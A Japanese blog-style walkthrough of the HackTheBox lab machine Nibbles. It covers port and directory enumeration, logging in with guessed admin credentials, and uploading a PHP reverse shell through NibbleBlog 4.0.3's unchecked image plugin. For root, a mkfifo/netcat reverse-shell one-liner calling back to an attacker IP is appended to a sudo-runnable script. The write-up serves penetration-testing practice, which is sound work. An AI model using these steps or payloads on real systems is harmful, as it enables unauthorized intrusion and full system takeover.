# はじめに
HackTheBoxの攻略などを自分用にまとめたものです。  
主に記録用として記しています。  
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">
GitHub(ペネトレーションテスト用チートシート):
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet
Twitter:@yukitsukai1731

# Nibbles
![スクリーンショット 2020-10-14 002351.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/50a7fefb-e919-da66-c7f7-f49fef00098b.png)

HackTheBox公式より
Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.

Nibbles はかなりシンプルなマシンですが、ログインブラックリストが含まれているため、有効な認証情報を見つけるのはかなり難しいです。幸いなことに、ユーザ名を列挙することができ、正しいパスワードを推測するのに時間はかかりません。

# Recon(偵察)
Nibbles(10.10.10.75)に対して、スキャンを行います。  
まずnmapでスキャンを開始します。

## nmap 

```
nmap -sC -sV -oN nmap/initial 10.10.10.75
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -p-...全ポートスキャン
- -oN...通常出力

```
# Nmap 7.80 scan initiated Fri Oct  9 03:18:33 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.75
Nmap scan report for 10.10.10.75
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct  9 03:18:57 2020 -- 1 IP address (1 host up) scanned in 24.36 seconds
```

この結果から、22,80番ポートが空いていることが分かります。  
まずは80番ポートを確認してみます。
![スクリーンショット 2020-10-14 002842.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/2666c7e6-bd97-f0c2-963c-d9330af5f53e.png)
ソースコードを表示すると/nibbleblog/について言及があるので、アクセスしてみます。
![スクリーンショット 2020-10-14 002910.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/cb18fce7-3141-9c9d-da73-04006473ad87.png)
すると以下のようなページにアクセスすることができます。
![スクリーンショット 2020-10-14 002927.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/52f9d949-fc0b-4947-86b6-29e2f8608f2b.png)
ここからgobusterを使ってディレクトリ・ファイルの列挙を行っていきます。

## gobuster

```
gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 50 -o gobuster/initial
```

```
kali@kali:~/htb/Nibbles/gobuster$ cat initial
/content (Status: 301)
/sitemap.php (Status: 200)
/themes (Status: 301)
/feed.php (Status: 200)
/index.php (Status: 200)
/admin (Status: 301)
/admin.php (Status: 200)
/plugins (Status: 301)
/install.php (Status: 200)
/update.php (Status: 200)
/README (Status: 200)
/languages (Status: 301)
/LICENSE.txt (Status: 200)
/COPYRIGHT.txt (Status: 200)
```

/READMEにアクセスをすると、nibbleblog 4.0.3というバージョンを確認することができます。
![スクリーンショット 2020-10-14 003328.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/3a75cdd3-b7e1-e14c-9ba7-31dda7de3561.png)
nibbleblogのバージョンが分かったところで、googleを使って、使えそうなexploitを検索してみます。
https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html
![スクリーンショット 2020-10-14 004911.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/8da0b254-8670-26e8-9e3a-5502e902e87f.png)

どうやらMy imageプラグインを使ったアップロードに拡張子のチェックがされていないためPHPファイルをアップロードできる脆弱性があるようです。

![スクリーンショット 2020-10-14 003414.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/98429967-0f03-4b1f-ad6c-3e6cfaa16642.png)

しかしこの脆弱性を利用するには、nibbleblogの管理ページにアクセスする必要があります。  
/admin.php
![スクリーンショット 2020-10-14 005704.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/f3a75ec3-7df5-2dca-0ecf-e08be3038a5c.png)
ユーザ名やパスワードの手がかりを探すと、/nibbleblog/content/private/users.xmlにadminと記載されていることが分かります。
![スクリーンショット 2020-10-14 005505.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c2deb9fd-a6f4-3d73-021b-be309794e4bb.png)
またgoogleで検索すると、nibbleblogにはデフォルトのパスワードは存在せず、インストール時にパスワードを設定するタイプのようです。

いろいろパスワードを入れてみると、admin/nibblesでログインに成功します。
![スクリーンショット 2020-10-14 010135.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/addd6ac4-ce83-f487-381e-223bbfefc216.png)

# exploitation(侵入)
ここから下記のサイトを参考にphpシェルのアップロードを行います。
https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/
![スクリーンショット 2020-10-14 004524.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/b9fbcfd4-911f-0b63-d16b-ce4bb525bb92.png)
[Plugins]→[My image]→[Configure]と進んでいくとアップロード画面にたどり着きます。
![スクリーンショット 2020-10-14 010804.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/eb73359d-ab61-4730-fa47-167198c46da1.png)

pentestmonkeyのphp reverse shellを自身のIPと待ち受けportに書き換えてアップロードするファイルを用意します。
![スクリーンショット 2020-10-14 010724.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/93289baa-f265-7aec-abc3-4dd53b5a1b3f.png)
![スクリーンショット 2020-10-14 010704.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/84197119-94ec-c394-1a33-f91a2e312c44.png)

作成したreverse_shellファイルをアップロードします。
![スクリーンショット 2020-10-14 011059.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/fae1e24d-b84a-0459-1a9b-4d23a6fdf073.png)
いろいろエラーが出ますが、気にしなくて大丈夫なようです。
![スクリーンショット 2020-10-14 011116.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1a47e880-7738-658a-7065-ddb51b6c4801.png)

/nibbleblog/content/private/plugins/my_imageにアクセスし、netcatで通信を待ち受けてからimage.phpを押下します。
![スクリーンショット 2020-10-14 011334.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/6161325f-31c5-8f35-ea3f-864b438bd58e.png)
完了すると、シェルをゲットすることができます。  
python3が入っているようなのでより使いやすいシェルにしておきます。

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![スクリーンショット 2020-10-14 011723.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a7044981-e183-9a59-6f73-cb5e2329d5d7.png)

# Privileges Escalation(権限昇格)
sudo -lコマンドを使って悪用できそうな権限設定のミスがないか列挙します。

```
sudo -l
```
この結果から、/home/nibbler/personal/stuff/monitor.shはNOPASSWDでroot権限として動作させることができるようです。
![スクリーンショット 2020-10-14 012041.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/b942d26e-b49c-edc1-fed0-3bcdb8a9caa4.png)
monitor.shの中身を見てみます。  
personal.zipがあるのでunzipしてから確認します。
![スクリーンショット 2020-10-14 012616.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c94d48c3-1233-7512-dbf6-c43301770c3c.png)

nibblesに入っているnetcatは -eオプションが使えなかったため以下のものをmonitor.shに追加します。
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 8888" >> monitor.sh
```

netcatで待ち受けてから、monitor.shをsudo権限で実行します。

```
nc -lvnp 8888
```

```
sudo ./monitor.sh
```

![スクリーンショット 2020-10-14 013315.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a4418e53-1606-ab09-decf-22cf2104908a.png)
お疲れさまでした。
root権限を取得することができました。
